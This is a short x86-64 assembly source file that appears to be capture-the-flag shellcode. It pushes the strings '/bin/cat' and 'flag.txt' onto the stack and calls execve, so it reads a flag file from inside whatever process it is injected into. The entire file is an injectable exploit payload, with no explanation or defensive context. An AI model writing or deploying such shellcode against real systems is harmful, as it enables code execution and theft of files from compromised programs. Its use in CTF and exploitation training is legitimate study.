BITS 64

%define SYS_EXECVE 59
%define SYS_EXIT 60

section .text
    global shellcode

    shellcode:
        xor rsi, rsi
        push rsi 
        mov r11, 0x7461632f6e69622f
        push r11 
        push rsi
        mov r11, 0x7478742e67616c66 ;filename
        push r11
        mov r13, rsp
        lea rdi, [rsp+16]
        push rsi
        push r13
        push rdi
        mov rsi,rsp
        xor al, al    
        mov al, SYS_EXECVE       
        xor rdx, rdx
        syscall 